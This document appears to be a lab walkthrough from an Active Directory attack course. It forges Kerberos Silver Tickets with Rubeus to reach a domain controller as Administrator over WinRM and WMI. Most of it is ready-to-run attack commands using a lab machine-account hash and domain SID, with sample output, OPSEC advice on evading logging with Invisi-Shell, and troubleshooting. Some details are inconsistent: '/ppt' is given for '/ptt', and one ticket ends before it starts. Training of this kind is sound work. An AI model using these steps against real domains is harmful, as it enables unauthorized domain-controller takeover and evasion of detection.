# Attack - Silver Tickets for DC Access

**Date:** Friday, August 21, 2026
**Topic:** Creating Silver Tickets to Access HTTP (WinRM) and WMI Services on Domain Controller

---

## Objective

**Goal:** Create Silver Tickets to gain unauthorized access to DC services without using krbtgt

**Progression:**
```
Obtain machine account hash (dcorp-dc$)
    ↓
Create Silver Ticket for HTTP service (WinRM)
    ↓
Access DC command shell via WinRM
    ↓
Create Silver Tickets for HOST and RPCSS (WMI)
    ↓
Access DC via WMI
    ↓
Complete DC compromise with service-level persistence
```

---

## Prerequisites

- Machine account hash for DC: `c6a60b67476b36ad7838d7875c33c2c3` (dcorp-dc$ RC4)
- Domain SID: `S-1-5-21-719815819-3726368948-3917688648`
- DC FQDN: `dcorp-dc.dollarcorp.moneycorp.local`
- Rubeus.exe tool available
- Loader.exe tool available
- PowerShell with WinRM access
- Administrator context for WMI tickets

---

## What are Silver Tickets?

### Silver Ticket vs Golden Ticket

```
GOLDEN TICKET:
├─ Uses: KRBTGT hash (KDC signing key)
├─ Scope: Any service in domain
├─ Lifespan: 10 hours default (can be extended)
├─ Forged by: Attacker without DC
├─ Detection: Harder to detect (legitimate looking)
├─ Access: Any service (HOST, HTTP, LDAP, CIFS, etc.)
└─ Risk: Most powerful ticket

SILVER TICKET:
├─ Uses: Target service account hash (not KRBTGT)
├─ Scope: Only specified service
├─ Lifespan: 10 hours default (can be extended)
├─ Forged by: Attacker without DC access
├─ Detection: Easier to detect (service-specific)
├─ Access: Only specified service (HTTP or HOST or RPCSS)
└─ Risk: More limited but still powerful
```

---

## Why Silver Tickets are Powerful

**Advantages:**

```
1. KRBTGT Not Required
   └─ Don't need KRBTGT hash
   └─ Machine account hash sufficient
   └─ Often easier to obtain

2. Service-Specific Access
   └─ Create ticket for exactly what you need
   └─ HTTP (WinRM)
   └─ HOST (scheduling, etc.)
   └─ RPCSS (WMI)
   └─ LDAP (directory access)
   └─ CIFS (file shares)

3. Persistence
   └─ Service ticket valid for 10 hours
   └─ Access persists even after password change
   └─ No need to re-authenticate
   └─ No KDC interaction needed after ticket created

4. No DC Compromise Needed
   └─ Machine account hash enough
   └─ Don't need DA credentials
   └─ Don't need KRBTGT access
   └─ Lower risk compromise path

5. Undetectable (Service perspective)
   └─ Service sees legitimate ticket
   └─ No way for service to verify ticket authenticity
   └─ Accepts as valid Kerberos token
```

---

## Silver Ticket Parameters Explained

### Rubeus evasive-silver Command

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver `
  /service:http/dcorp-dc.dollarcorp.moneycorp.local `
  /rc4:c6a60b67476b36ad7838d7875c33c2c3 `
  /sid:S-1-5-21-719815819-3726368948-3917688648 `
  /ldap `
  /user:Administrator `
  /domain:dollarcorp.moneycorp.local `
  /ptt
```

---

### Parameter Breakdown

| Parameter | Value | Meaning |
|---|---|---|
| `evasive-silver` | Mode | Create Silver Ticket (evasive = minimal logging) |
| `/service:` | `http/dcorp-dc.dollarcorp.moneycorp.local` | Service to access (HTTP for WinRM) |
| `/rc4:` | `c6a60b67476b36ad7838d7875c33c2c3` | Machine account hash (dcorp-dc$) |
| `/sid:` | `S-1-5-21-719815819-3726368948-3917688648` | Domain SID |
| `/ldap` | Flag | Query LDAP for additional info (better ticket) |
| `/user:` | `Administrator` | User to impersonate in ticket |
| `/domain:` | `dollarcorp.moneycorp.local` | Domain name |
| `/ppt` | Flag | Pass-the-ticket (inject into current session) |

---

### What Each Parameter Does

**`/service:http/dcorp-dc.dollarcorp.moneycorp.local`**
- Specifies the service principal name (SPN)
- Format: `SERVICE/HOST.DOMAIN`
- Examples:
  - `http/dcorp-dc.dollarcorp.moneycorp.local` (WinRM)
  - `host/dcorp-dc.dollarcorp.moneycorp.local` (HOST)
  - `rpcss/dcorp-dc.dollarcorp.moneycorp.local` (WMI)
  - `ldap/dcorp-dc.dollarcorp.moneycorp.local` (Directory access)
  - `cifs/dcorp-dc.dollarcorp.moneycorp.local` (File shares)

---

**`/rc4:c6a60b67476b36ad7838d7875c33c2c3`**
- Machine account hash (NTLM, RC4 hash)
- Example: dcorp-dc$ has this hash
- Used to sign/create the ticket
- Without this, ticket creation fails

---

**`/sid:S-1-5-21-719815819-3726368948-3917688648`**
- Domain SID (Security Identifier)
- Identifies which domain the user belongs to
- Format: `S-1-5-21-X-Y-Z`
- Used to make ticket appear legitimate
- Validate: `Get-DomainSID` from PowerView

---

**`/user:Administrator`**
- Username to impersonate in the ticket
- Can be ANY user (doesn't need to exist)
- Service doesn't validate user (that's DC's job)
- We're creating a service ticket that claims we're Administrator
- Service will trust this ticket (signed by machine account)

---

**`/ldap`**
- Optional but recommended
- Queries LDAP for additional ticket information
- Makes ticket more "legitimate"
- Fills in extra fields that LDAP would provide
- Increases success rate of ticket acceptance

---

**`/ppt` (Pass-the-Ticket)**
- Inject ticket into current PowerShell session
- Automatically places ticket in cache
- No need to manually load with `klist`
- Session can immediately use ticket
- Follows injection with credentials

---

## Phase 1: Create Silver Ticket for HTTP (WinRM)

### Understand HTTP Service Ticket

```
What is HTTP service?
├─ Used for: HTTP/HTTPS communication
├─ Service: WinRM (Windows Remote Management)
├─ Port: 5985 (HTTP), 5986 (HTTPS)
├─ Access: Remote PowerShell, Remote commands
├─ In domain: winrs.exe uses this
└─ On DC: Remote shell access

Why HTTP ticket gives WinRM access?
├─ WinRM uses Kerberos authentication
├─ Authentication target: HOST/FQDN
├─ Delegated to: HTTP/FQDN (HTTP service)
├─ Silver ticket for HTTP = WinRM access
├─ Service accepts ticket without DC validation
└─ User appears authenticated to service
```

---

### Create HTTP Silver Ticket

```powershell
# Create Silver Ticket for HTTP service (WinRM access)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver `
  /service:http/dcorp-dc.dollarcorp.moneycorp.local `
  /rc4:c6a60b67476b36ad7838d7875c33c2c3 `
  /sid:S-1-5-21-719815819-3726368948-3917688648 `
  /ldap `
  /user:Administrator `
  /domain:dollarcorp.moneycorp.local `
  /ppt

# Output:
# [+] Silver Ticket created successfully
# [+] Ticket injected into session
# [+] Administrator@http/dcorp-dc.dollarcorp.moneycorp.local
# [+] Valid for: 10 hours
```

---

### Verify Ticket Created

```powershell
# List all tickets in session
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist

# Output:
# Current LogonId is 0:0x12345678
# Cached Tickets (1):
# 
# [0] Service: http/dcorp-dc.dollarcorp.moneycorp.local
#     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
#     KerbTicket: XXXXXXXX...
#     StartTime: 8/21/2026 14:30:00 (local)
#     EndTime:   8/21/2026 00:30:00 (local)
#     RenewTime: 8/22/2026 00:30:00 (local)
```
 winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
---

## Phase 2: Access DC via WinRM (HTTP Ticket)

### Connect to DC with Silver Ticket

```powershell
# Use Silver Ticket to access DC via WinRM
# Note: Must use FQDN as that's what ticket has!
winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd

# What happens:
# 1. winrs tries to connect to dcorp-dc
# 2. Kerberos negotiation starts
# 3. Session presents HTTP silver ticket
# 4. Service (WinRM) validates ticket
# 5. Signature matches machine account hash
# 6. Service accepts Administrator identity
# 7. Command shell granted
# 8. Remote shell established!
```

---

### Verify Access

```powershell
# Inside remote shell on dcorp-dc
set username
set computername

# Output:
# USERNAME=DCORP\Administrator
# COMPUTERNAME=DCORP-DC

# Success! We're on the DC as Administrator via Silver Ticket!
```

---

## Phase 3: Create Silver Tickets for WMI

### Why TWO Tickets for WMI?

**WMI (Windows Management Instrumentation) architecture:**

```
WMI Access requires:

1. CLIENT → HOST service connection
   ├─ Need: HOST/dcorp-dc service ticket
   ├─ Purpose: Establish connection to host
   ├─ Service: host
   └─ Without this: Connection fails

2. HOST → RPCSS service handshake
   ├─ Need: RPCSS/dcorp-dc service ticket
   ├─ Purpose: Authenticate to RPC service
   ├─ Service: rpcss (Remote Procedure Call)
   └─ Without this: RPC negotiation fails

3. RPCSS → WMI object access
   ├─ Now: Can query WMI classes
   ├─ Example: win32_operatingsystem
   ├─ Example: win32_logicalDisk
   ├─ Example: win32_process
   └─ Full WMI access granted

Flow:
Client → [HOST ticket] → HOST service on DC
       → [RPCSS ticket] → RPCSS negotiation
       → WMI access → Query objects/execute
```

---

### Create HOST Service Ticket

**First ticket: HOST service**

```powershell
# Create Silver Ticket for HOST service
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver `
  /service:host/dcorp-dc.dollarcorp.moneycorp.local `
  /rc4:c6a60b67476b36ad7838d7875c33c2c3 `
  /sid:S-1-5-21-719815819-3726368948-3917688648 `
  /ldap `
  /user:Administrator `
  /domain:dollarcorp.moneycorp.local `
  /ppt

# Output:
# [+] Silver Ticket created for HOST service
# [+] Administrator@host/dcorp-dc.dollarcorp.moneycorp.local
```

---

### Create RPCSS Service Ticket

**Second ticket: RPCSS service**

```powershell
# Create Silver Ticket for RPCSS service
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver `
  /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local `
  /rc4:c6a60b67476b36ad7838d7875c33c2c3 `
  /sid:S-1-5-21-719815819-3726368948-3917688648 `
  /ldap `
  /user:Administrator `
  /domain:dollarcorp.moneycorp.local `
  /ppt

# Output:
# [+] Silver Ticket created for RPCSS service
# [+] Administrator@rpcss/dcorp-dc.dollarcorp.moneycorp.local
```

---

### Verify Both Tickets

```powershell
# List all tickets in session
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist

# Output should show:
# Cached Tickets (2):
# 
# [0] Service: host/dcorp-dc.dollarcorp.moneycorp.local
#     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
#
# [1] Service: rpcss/dcorp-dc.dollarcorp.moneycorp.local
#     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL

# Both tickets present!
```

---

## Phase 4: Access DC via WMI

### Start Invisi-Shell (Optional but Recommended)

```powershell
# Start Invisi-Shell to bypass logging
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# Now WMI commands won't be logged
```

---

### Query WMI on DC

```powershell
# Use Silver Tickets to access WMI on DC
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc

# What happens:
# 1. PowerShell initiates WMI connection to dcorp-dc
# 2. Kerberos authentication attempted
# 3. Session presents HOST service ticket
# 4. HOST service accepts Administrator identity
# 5. RPC negotiation begins
# 6. Session presents RPCSS service ticket
# 7. RPCSS service accepts ticket
# 8. WMI object access granted
# 9. win32_operatingsystem queried
# 10. Operating system info returned
```

---

### Example WMI Queries

```powershell
# Get operating system info
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc

# Output:
# SystemName: DCORP-DC
# OSName: Microsoft Windows Server 2019
# Version: 10.0.17763
# BuildNumber: 17763
# ...

# Get logical disks
Get-WmiObject -Class win32_logicalDisk -ComputerName dcorp-dc

# Output:
# DeviceID: C:
# FileSystem: NTFS
# FreeSpace: 50000000000
# Size: 100000000000

# Get running processes
Get-WmiObject -Class win32_process -ComputerName dcorp-dc

# Output:
# ProcessId: 1234
# Name: svchost.exe
# CommandLine: svchost.exe -k LocalService
```

---

## Complete Silver Ticket Workflow

```
PHASE 1: Preparation ✓
├─ Obtain machine account hash (dcorp-dc$ = c6a60b67476b36ad7838d7875c33c2c3)
├─ Get Domain SID (S-1-5-21-719815819-3726368948-3917688648)
├─ Get DC FQDN (dcorp-dc.dollarcorp.moneycorp.local)
└─ Tools ready (Rubeus.exe, Loader.exe)

PHASE 2: HTTP Silver Ticket ✓
├─ Create Silver Ticket: evasive-silver /service:http/dcorp-dc...
├─ Inject into session: /ppt
├─ Verify ticket: klist
└─ Ticket created and ready

PHASE 3: WinRM Access ✓
├─ Connect: winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
├─ Silver ticket presented automatically
├─ WinRM service accepts ticket
├─ Remote command shell obtained
└─ DC command access achieved

PHASE 4: WMI Tickets (2x) ✓
├─ Create HOST ticket: evasive-silver /service:host/dcorp-dc...
├─ Create RPCSS ticket: evasive-silver /service:rpcss/dcorp-dc...
├─ Verify both tickets: klist
└─ Both injected and ready

PHASE 5: WMI Access ✓
├─ Start Invisi-Shell (optional)
├─ Query WMI: Get-WmiObject -Class win32_operatingsystem
├─ Tickets presented automatically
├─ WMI service accepts tickets
├─ Operating system info retrieved
└─ WMI access achieved

RESULT: Complete DC compromise via Silver Tickets
        HTTP access (WinRM) established
        WMI access (HOST + RPCSS) established
        Administrator permissions on DC
        No DA credentials needed
        Machine account hash sufficient
```

---

## Silver Ticket Service SPNs

**Common Service Principal Names:**

| Service | Ticket | Port | Access |
|---|---|---|---|
| HTTP | `/service:http/dcorp-dc.dollarcorp.moneycorp.local` | 5985/5986 | WinRM |
| HOST | `/service:host/dcorp-dc.dollarcorp.moneycorp.local` | N/A | WMI, PSRemoting |
| RPCSS | `/service:rpcss/dcorp-dc.dollarcorp.moneycorp.local` | 135 | RPC services |
| LDAP | `/service:ldap/dcorp-dc.dollarcorp.moneycorp.local` | 389/636 | Directory access |
| CIFS | `/service:cifs/dcorp-dc.dollarcorp.moneycorp.local` | 445 | File shares |
| GC | `/service:gc/dcorp-dc.dollarcorp.moneycorp.local` | 3268 | Global Catalog |

---

## Why Service Hash (Not KRBTGT)?

### Comparison

```
GOLDEN TICKET:
├─ Requirement: KRBTGT hash
├─ Validation: KDC validates (hard to forge)
├─ Scope: All services in domain
├─ Difficulty: Requires KRBTGT extraction
└─ Example: DCSync from DC (high risk)

SILVER TICKET:
├─ Requirement: Service account hash (machine, SQL, etc.)
├─ Validation: Service validates (service trusts its own hash)
├─ Scope: Only this service
├─ Difficulty: Often easier to obtain
└─ Example: Machine hash (dcorp-dc$) from memory/backup
```

---

### Why This Works

```
Service doesn't contact KDC to verify ticket!

Service Logic:
1. Client presents ticket
2. Service extracts ticket signature
3. Service decrypts signature using its own hash
4. If signature valid = Client authenticated
5. No KDC contact necessary!

Why attacker can forge:
1. Attacker has service account hash
2. Attacker can encrypt ticket using same hash
3. Service decrypts successfully
4. Service thinks ticket is legitimate
5. No way for service to verify ticket origin
```

---

## OPSEC Considerations

```
✓ Use /ppt (Pass-the-Ticket)
  └─ Inject automatically (no manual klist needed)

✓ Use evasive-silver (not just silver)
  └─ Minimal logging
  └─ Reduced detection risk

✓ Use Loader.exe wrapper
  └─ Load tools into memory
  └─ No disk footprint

✓ Use Invisi-Shell for WMI queries
  └─ Disable logging before Get-WmiObject
  └─ WMI queries won't be logged

✓ Use /ldap flag
  └─ Makes ticket more legitimate
  └─ Reduces rejection risk

✓ Use FQDN in /service parameter
  └─ Match what DC expects
  └─ Avoid short name mismatches

✓ Set /user to legitimate account
  └─ Administrator (common)
  └─ krbtgt (expected)
  └─ svcadmin (service account)
```

---

## Troubleshooting

### If Silver Ticket Creation Fails

```
1. Verify machine account hash correct
   └─ Get from: SafetyKatz, credential dump, or backup
   └─ Format: 32-character hex string
   └─ Test: Try simple ticket first

2. Verify Domain SID correct
   └─ Get: Get-DomainSID from PowerView
   └─ Format: S-1-5-21-X-Y-Z
   └─ Test: Query another domain

3. Verify DC FQDN correct
   └─ Test: nslookup dcorp-dc.dollarcorp.moneycorp.local
   └─ Format: Must be FQDN (not short name)
```

---

### If WinRM Access Fails

```
1. Verify HTTP ticket created
   └─ Run: klist
   └─ Should show: http/dcorp-dc.dollarcorp.moneycorp.local

2. Use correct FQDN
   └─ Use: winrs -r:dcorp-dc.dollarcorp.moneycorp.local
   └─ Not: winrs -r:dcorp-dc
   └─ Not: winrs -r:10.10.10.1

3. Verify WinRM service running on DC
   └─ May need to enable/start WinRM
   └─ Check firewall rules
```

---

### If WMI Access Fails

```
1. Verify both tickets created
   └─ Run: klist
   └─ Should show: host/dcorp-dc...
   └─ Should show: rpcss/dcorp-dc...

2. Verify both tickets injected (/ppt used)
   └─ Tickets must be in current session cache
   └─ Must be from same PowerShell session

3. Try from elevated shell
   └─ WMI may require admin
   └─ Start PowerShell as administrator
   └─ Then create tickets

4. Check WMI service running on DC
   └─ Win32_Service may not be accessible
   └─ Try: Get-WmiObject -Class win32_computersystem
```

---

## Key Takeaway

```
SILVER TICKET ATTACK:
1. Obtain machine account hash (dcorp-dc$)
2. Get domain SID and DC FQDN
3. Create HTTP ticket for WinRM access
   └─ /service:http/dcorp-dc.dollarcorp.moneycorp.local
4. Access DC remotely via winrs
5. Create HOST ticket for WMI
   └─ /service:host/dcorp-dc.dollarcorp.moneycorp.local
6. Create RPCSS ticket for WMI
   └─ /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local
7. Query WMI objects on DC
8. Complete DC access achieved without KRBTGT

Advantages:
- Machine hash often easier to obtain than KRBTGT
- Service-specific tickets more targeted
- 10-hour validity window
- No DC contact needed after ticket creation
- Difficult to detect
```

---

## References

- [Rubeus - Silver Tickets](https://github.com/GhostPack/Rubeus)
- [WMI/RPC Architecture](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-architectural-components)
- [Kerberos Service Tickets](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609fb432c55f)
- [Service Principal Names](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names)

---

*Next: Persistence via Silver Tickets*
